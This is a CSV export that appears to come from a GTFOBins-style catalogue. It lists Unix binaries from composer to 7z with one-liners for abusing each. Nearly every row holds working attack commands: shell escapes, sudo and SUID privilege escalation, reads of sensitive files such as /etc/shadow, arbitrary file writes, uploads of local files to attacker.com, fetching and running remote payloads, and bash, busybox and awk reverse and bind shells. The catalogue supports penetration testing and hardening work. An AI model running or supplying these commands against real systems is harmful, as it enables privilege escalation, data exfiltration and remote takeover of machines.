"composer","","","TF=$(mktemp -d) echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json composer --working-dir=$TF run-script x","","","TF=$(mktemp -d) echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json sudo composer --working-dir=$TF run-script x","","","","","","","","","TF=$(mktemp -d) echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json ./composer --working-dir=$TF run-script x","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"comm","","","","","","LFILE=file_to_read sudo comm $LFILE /dev/null 2>/dev/null","","","LFILE=file_to_read comm $LFILE /dev/null 2>/dev/null","","LFILE=file_to_read comm $LFILE /dev/null 2>/dev/null","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"column","","","","","","LFILE=file_to_read sudo column $LFILE","`column` expects textual data.","","LFILE=file_to_read column $LFILE","","LFILE=file_to_read ./column $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cobc","","","TF=$(mktemp -d) echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x cobc -xFj --frelax-syntax-checks $TF/x","","","TF=$(mktemp -d) echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x sudo cobc -xFj --frelax-syntax-checks $TF/x","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cmp","","","","","","LFILE=file_to_read sudo cmp $LFILE /dev/zero -b -l","Dump the bytes of the input file that are different from the NUL byte in a tabular format, hence this may not be suitable to read arbitrary binary files.","","LFILE=file_to_read cmp $LFILE /dev/zero -b -l","","LFILE=file_to_read ./cmp $LFILE /dev/zero -b -l","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"clamscan","","","","","","LFILE=file_to_read TF=$(mktemp -d) touch $TF/empty.yara sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","Each line of the file is interpreted as a path and the content is leaked via error messages, thus this might not be suitable to read binary files. The output can optionally be cleaned using `sed`.","","LFILE=file_to_read TF=$(mktemp -d) touch $TF/empty.yara clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","","LFILE=file_to_read TF=$(mktemp -d) touch $TF/empty.yara ./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"chroot","","","","","","sudo chroot /","","","","","./chroot / /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"chown","","","","","","LFILE=file_to_change sudo chown $(id -un):$(id -gn) $LFILE","This can be run with elevated privileges to change ownership and then read, write, or execute a file.","","","","LFILE=file_to_change ./chown $(id -un):$(id -gn) $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"choom","","","choom -n 0 /bin/sh","","","sudo choom -n 0 /bin/sh","","","","","./choom -n 0 -- /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"chmod","","","","","","LFILE=file_to_change sudo chmod 6777 $LFILE","This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.","","","","LFILE=file_to_change ./chmod 6777 $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"check_statusfile","","","","","","LFILE=file_to_read sudo check_statusfile $LFILE","This is the `check_statusfile` Nagios plugi plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.","","LFILE=file_to_read check_statusfile $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"check_ssl_cert","","","","","The host example.net must return a certificate via TLS","COMMAND=id OUTPUT=output_file TF=$(mktemp) echo ""$COMMAND | tee $OUTPUT"" > $TF chmod +x $TF umask 022 check_ssl_cert --curl-bin $TF -H example.net cat $OUTPUT","This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.","","","","","","","","","","","","","","","","","","The host example.net must return a certificate via TLS","COMMAND=id OUTPUT=output_file TF=$(mktemp) echo ""$COMMAND | tee $OUTPUT"" > $TF chmod +x $TF check_ssl_cert --curl-bin $TF -H example.net cat $OUTPUT","","","","","","","","","","","","","","","","","","","","","false"
"check_raid","","","","","","LFILE=file_to_read sudo check_raid --extra-opts=@$LFILE","This is the `check_raid` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.","","LFILE=file_to_read check_raid --extra-opts=@$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"check_memory","","","","","","LFILE=file_to_read sudo check_memory --extra-opts=@$LFILE","This is the `check_memory` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.","","LFILE=file_to_read check_memory --extra-opts=@$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"check_log","","","","","","LFILE=file_to_write INPUT=input_file sudo check_log -F $INPUT -O $LFILE","This is the `check_log` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.","","LFILE=file_to_read OUTPUT=output_file check_log -F $LFILE -O $OUTPUT cat $OUTPUT","","","","LFILE=file_to_write INPUT=input_file check_log -F $INPUT -O $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"check_cups","","","","","","LFILE=file_to_read sudo check_cups --extra-opts=@$LFILE","This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.","","LFILE=file_to_read check_cups --extra-opts=@$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"check_by_ssh","","The shell will only last 10 seconds.","check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx","","The shell will only last 10 seconds.","sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx","This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.  When `check_by_ssh` version `2.4.5` (2023-05-31) or later from the Nagios Plugins project in it's default configuration is used, it does not work anymore.  It does still work on previous versions from the Nagios Plugins project or all versions from the Monitoring Project (e.g. used by Ubuntu/Debian).","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"certbot","","","TF=$(mktemp -d) certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'","","","TF=$(mktemp -d) sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cdist","","","cdist shell -s /bin/sh","","","sudo cdist shell -s /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cat","","","","","","LFILE=file_to_read sudo cat ""$LFILE""","","","LFILE=file_to_read cat ""$LFILE""","","LFILE=file_to_read ./cat ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"capsh","","","capsh --","","","sudo capsh --","","","","","./capsh --gid=0 --uid=0 --","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cancel","","","","","","","","","","","","","","","","","","","","","","","","","","","","Send local file using a TCP connection. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file.","RHOST=attacker.com RPORT=12345 LFILE=file_to_send cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT","","","","","","","","","","","","","","","","","","false"
"cabal","","","cabal exec -- /bin/sh","","","sudo cabal exec -- /bin/sh","","","","","./cabal exec -- /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"c99","","","c99 -wrapper /bin/sh,-s .","","","sudo c99 -wrapper /bin/sh,-s .","","","LFILE=file_to_read c99 -x c -E ""$LFILE""","","","","LFILE=file_to_delete c99 -xc /dev/null -o $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"c89","","","c89 -wrapper /bin/sh,-s .","","","sudo c89 -wrapper /bin/sh,-s .","","","LFILE=file_to_read c89 -x c -E ""$LFILE""","","","","LFILE=file_to_delete c89 -xc /dev/null -o $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bzip2","","","","","","LFILE=file_to_read sudo bzip2 -c $LFILE | bzip2 -d","There are also a number of other utilities that rely on `bzip2` under the hood, e.g., `bzless`, `bzcat`, `bunzip2`, etc. Besides having similar features, they also allow privileged reads if `bzip2` itself is SUID.","","LFILE=file_to_read bzip2 -c $LFILE | bzip2 -d","","LFILE=file_to_read ./bzip2 -c $LFILE | bzip2 -d","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"byebug","","","TF=$(mktemp) echo 'system(""/bin/sh"")' > $TF byebug $TF continue","","","TF=$(mktemp) echo 'system(""/bin/sh"")' > $TF sudo byebug $TF continue","","","","","","","","","TF=$(mktemp) echo 'system(""/bin/sh"")' > $TF ./byebug $TF continue","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"busybox","","","busybox sh","","","sudo busybox sh","BusyBox may contain many UNIX utilities, run `busybox --list-full` to check what GTFOBins binaries are supported. Here some example.","","LFILE=file_to_read ./busybox cat ""$LFILE""","","./busybox sh","","LFILE=file_to_write busybox sh -c 'echo ""DATA"" > $LFILE'","","","","","","","It may drop the SUID privileges depending on the compilation flags and the runtime configuration.","","","","","","","","Serve files in the local folder running an HTTP server.","LPORT=12345 busybox httpd -f -p $LPORT -h .","","","Run `nc -lvp 12345` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 busybox nc -e /bin/sh $RHOST $RPORT","","","","","","","","","","","","","","false"
"busctl","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","[''busctl --show-machine !/bin/sh ''-|-''busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2' '']","","","sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'","","","","","./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bundler","","[''This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.''-|-''This spawns an interactive shell via [`irb`](/gtfobins/irb/).'']","[''bundler help !/bin/sh ''-|-''export BUNDLE_GEMFILE=x bundler exec /bin/sh ''-|-''TF=$(mktemp -d) touch $TF/Gemfile cd $TF bundler exec /bin/sh ''-|-''TF=$(mktemp -d) touch $TF/Gemfile cd $TF bundler console system('/bin/sh -c /bin/sh') ''-|-''TF=$(mktemp -d) echo 'system(""/bin/sh"")' > $TF/Gemfile cd $TF bundler install '']","","This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.","sudo bundler help !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bundle","","[''This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.''-|-''This spawns an interactive shell via [`irb`](/gtfobins/irb/).'']","[''bundle help !/bin/sh ''-|-''export BUNDLE_GEMFILE=x bundle exec /bin/sh ''-|-''TF=$(mktemp -d) touch $TF/Gemfile cd $TF bundle exec /bin/sh ''-|-''TF=$(mktemp -d) touch $TF/Gemfile cd $TF bundle console system('/bin/sh -c /bin/sh') ''-|-''TF=$(mktemp -d) echo 'system(""/bin/sh"")' > $TF/Gemfile cd $TF bundle install '']","","This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.","sudo bundle help !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bridge","","","","","","LFILE=file_to_read sudo bridge -b ""$LFILE""","Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.","","LFILE=file_to_read bridge -b ""$LFILE""","","LFILE=file_to_read ./bridge -b ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bpftrace","","","","","","[''sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'''-|-''TF=$(mktemp) echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF sudo bpftrace $TF ''-|-''sudo bpftrace -c /bin/sh -e 'END {exit()}''']","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bconsole","","","bconsole @exec /bin/sh","","","sudo bconsole @exec /bin/sh","","","bconsole -c /etc/shadow","","","","","","","","","","The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bc","","","","","","LFILE=file_to_read sudo bc -s $LFILE quit","The file content is actually parsed and appears as error messages, thus it might not be suitable to read arbitray binary files.","","LFILE=file_to_read bc -s $LFILE quit","","LFILE=file_to_read ./bc -s $LFILE quit","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"batcat","","","batcat --paging always /etc/profile !/bin/sh","","","sudo batcat --paging always /etc/profile !/bin/sh","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply. `--paging always` can be omitted provided that the output doesn't fit the screen.","","","","","","","","./batcat --paging always /etc/profile !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bash","","","bash","","","sudo bash","","","[''export LFILE=file_to_read bash -c 'echo ""$(<$LFILE)""' ''-|-''LFILE=file_to_read HISTTIMEFORMAT=$'\r\e[K' history -r $LFILE history '']","","./bash -p","","[''export LFILE=file_to_write bash -c 'echo DATA > $LFILE' ''-|-''LFILE=file_to_write HISTIGNORE='history *' history -c DATA history -w $LFILE '']","","","","[''Fetch a remote file via HTTP GET request.''-|-''Fetch remote file using a TCP connection. Run `nc -l -p 12345 < ""file_to_send""` on the attacker box to send the file.'']","[''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_get bash -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \     3<>/dev/tcp/$RHOST/$RPORT \     | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_get bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE' '']","[''It trims trailing newlines and it's not binary-safe.''-|-''The read file content is surrounded by the current history content.'']","","","","","","","","","[''Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Send local file using a TCP connection. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file.'']","[''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send bash -c 'echo -e ""POST / HTTP/0.9\n\n$(<$LFILE)"" > /dev/tcp/$RHOST/$RPORT' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT' '']","This adds timestamps to the output file.","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'","","","","","","bash -c 'enable -f ./lib.so x'","","","","","","","","false"
"basez","","","","","","LFILE=file_to_read sudo basez ""$LFILE"" | basez --decode","","","LFILE=file_to_read basez ""$LFILE"" | basez --decode","","LFILE=file_to_read ./basez ""$LFILE"" | basez --decode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"basenc","","","","","","LFILE=file_to_read sudo basenc --base64 $LFILE | basenc -d --base64","","","LFILE=file_to_read basenc --base64 $LFILE | basenc -d --base64","","LFILE=file_to_read basenc --base64 $LFILE | basenc -d --base64","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"base64","","","","","","LFILE=file_to_read sudo base64 ""$LFILE"" | base64 --decode","","","LFILE=file_to_read base64 ""$LFILE"" | base64 --decode","","LFILE=file_to_read ./base64 ""$LFILE"" | base64 --decode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"base58","","","","","","LFILE=file_to_read sudo base58 ""$LFILE"" | base58 --decode","","","LFILE=file_to_read base58 ""$LFILE"" | base58 --decode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"base32","","","","","","LFILE=file_to_read sudo base32 ""$LFILE"" | base32 --decode","","","LFILE=file_to_read base32 ""$LFILE"" | base32 --decode","","LFILE=file_to_read base32 ""$LFILE"" | base32 --decode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"aws","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","aws help !/bin/sh","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","sudo aws help !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"awk","","","awk 'BEGIN {system(""/bin/sh"")}'","","","sudo awk 'BEGIN {system(""/bin/sh"")}'","","","LFILE=file_to_read awk '//' ""$LFILE""","","LFILE=file_to_read ./awk '//' ""$LFILE""","","LFILE=file_to_write awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","","./awk 'BEGIN {system(""/bin/sh"")}'","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {     s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;     while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;     while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","","","","","","","","","","","","Run `nc target.com 12345` on the attacker box to connect to the shell.","LPORT=12345 awk -v LPORT=$LPORT 'BEGIN {     s = ""/inet/tcp/"" LPORT ""/0/0"";     while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;     while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","","","","","","","","","","","false"
"atobm","","","","","","LFILE=file_to_read sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","Outputs the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`.","","LFILE=file_to_read atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","","LFILE=file_to_read ./atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"at","","","echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null","","","echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null","","","","","","","","","","","","","","","","","","","The invocation will be blind, but it is possible to redirect the output to a file in a readable location.","COMMAND=id echo ""$COMMAND"" | at now","","","","","","","","","","","","","","","","","","","","","false"
"aspell","","","","","","LFILE=file_to_read sudo aspell -c ""$LFILE""","The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.","","LFILE=file_to_read aspell -c ""$LFILE""","","LFILE=file_to_read ./aspell -c ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ash","","","ash","","","sudo ash","","","","","./ash","","export LFILE=file_to_write ash -c 'echo DATA > $LFILE'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ascii85","","","","","","LFILE=file_to_read sudo ascii85 ""$LFILE"" | ascii85 --decode","","","LFILE=file_to_read ascii85 ""$LFILE"" | ascii85 --decode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ascii-xfr","","","","","","LFILE=file_to_read sudo ascii-xfr -ns ""$LFILE""","","","LFILE=file_to_read ascii-xfr -ns ""$LFILE""","","LFILE=file_to_read ./ascii-xfr -ns ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"as","","","","","","LFILE=file_to_read sudo as @$LFILE","The file content is treated as command line options and disclosed throught error messages, so this is not suitable to read arbitrary binary data.","","LFILE=file_to_read as @$LFILE","","LFILE=file_to_read ./as @$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"arp","","","","","","LFILE=file_to_read sudo arp -v -f ""$LFILE""","The read file content is corrupted by error prints.","","LFILE=file_to_read arp -v -f ""$LFILE""","","LFILE=file_to_read ./arp -v -f ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"arj","","","","","The archive can also be prepared offline then uploaded.","TF=$(mktemp -d) LFILE=file_to_write LDIR=where_to_write echo DATA >""$TF/$LFILE"" arj a ""$TF/a"" ""$TF/$LFILE"" sudo arj e ""$TF/a"" $LDIR","","","TF=$(mktemp -u) LFILE=file_to_read arj a ""$TF"" ""$LFILE"" arj p ""$TF""","","TF=$(mktemp -d) LFILE=file_to_write LDIR=where_to_write echo DATA >""$TF/$LFILE"" arj a ""$TF/a"" ""$TF/$LFILE"" ./arj e ""$TF/a"" $LDIR","","TF=$(mktemp -d) LFILE=file_to_write LDIR=where_to_write echo DATA >""$TF/$LFILE"" arj a ""$TF/a"" ""$TF/$LFILE"" arj e ""$TF/a"" $LDIR","","","","","","The file appears amid some other textual information. The archive can also be downloaded then extracted offline.","The archive can also be prepared offline then uploaded.","","","","","","","","","","The archive can also be prepared offline then uploaded.","","","","","","","","","","","","","","","","","false"
"aria2c","","","","","","COMMAND='id' TF=$(mktemp) echo ""$COMMAND"" > $TF chmod +x $TF sudo aria2c --on-download-error=$TF http://x","Note that the subprocess is immediately sent to the background.","","","","","","","","COMMAND='id' TF=$(mktemp) echo ""$COMMAND"" > $TF chmod +x $TF ./aria2c --on-download-error=$TF http://x","","Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed.","URL=http://attacker.com/file_to_get LFILE=file_to_save aria2c -o ""$LFILE"" ""$URL""","","","","","","","The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.","[''COMMAND='id' TF=$(mktemp) echo ""$COMMAND"" > $TF chmod +x $TF aria2c --on-download-error=$TF http://x ''-|-''aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa'']","","","","","","","","","","","","","","","","","","","","","false"
"ar","","","","","","TF=$(mktemp -u) LFILE=file_to_read sudo ar r ""$TF"" ""$LFILE"" cat ""$TF""","The file appears amid the binary content of the archive.","","TF=$(mktemp -u) LFILE=file_to_read ar r ""$TF"" ""$LFILE"" cat ""$TF""","","TF=$(mktemp -u) LFILE=file_to_read ./ar r ""$TF"" ""$LFILE"" cat ""$TF""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"apt","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","apt changelog apt !/bin/sh","","[''This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''For this to work the target package (e.g., `sl`) must not be installed.''-|-''When the shell exits the `update` command is actually executed.'']","[''sudo apt changelog apt !/bin/sh ''-|-''TF=$(mktemp) echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF sudo apt install -c $TF sl ''-|-''sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh'']","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"apt-get","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","apt-get changelog apt !/bin/sh","","[''This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''For this to work the target package (e.g., `sl`) must not be installed.''-|-''When the shell exits the `update` command is actually executed.'']","[''sudo apt-get changelog apt !/bin/sh ''-|-''TF=$(mktemp) echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF sudo apt-get install -c $TF sl ''-|-''sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh'']","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"apache2ctl","","","","","","LFILE=file_to_read sudo apache2ctl -c ""Include $LFILE"" -k stop","This includes the file in the actual configuration file, the first line is leaked as an error message.","","LFILE=file_to_read apache2ctl -c ""Include $LFILE"" -k stop","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"aoss","","","aoss /bin/sh","","","sudo aoss /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ansible-test","","","ansible-test shell","","","sudo ansible-test shell","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ansible-playbook","","","TF=$(mktemp) echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF ansible-playbook $TF","","","TF=$(mktemp) echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF sudo ansible-playbook $TF","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"alpine","","","","","","LFILE=file_to_read sudo alpine -F ""$LFILE""","The file is displayed in the `alpine` curses terminal interface. Other options might be available, for example by pressing `S` is possible to save the file content elsewhere.","","LFILE=file_to_read alpine -F ""$LFILE""","","LFILE=file_to_read ./alpine -F ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"agetty","","","","","","","","","","","./agetty -o -p -l /bin/sh -a root tty","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ab","","","","","Upload local file via HTTP POST request.","URL=http://attacker.com/ LFILE=file_to_send sudo ab -p $LFILE $URL","","","","","URL=http://attacker.com/ LFILE=file_to_send ./ab -p $LFILE $URL","","","","","","Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.","URL=http://attacker.com/file_to_download ab -v2 $URL","","Upload local file via HTTP POST request.","","","","","","","","Upload local file via HTTP POST request.","URL=http://attacker.com/ LFILE=file_to_send ab -p $LFILE $URL","","","","","","","","","","","","","","","","","","false"
"aa-exec","","","aa-exec /bin/sh","","","sudo aa-exec /bin/sh","","","","","./aa-exec /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"7z","","","","","","LFILE=file_to_read sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so","","","LFILE=file_to_read 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
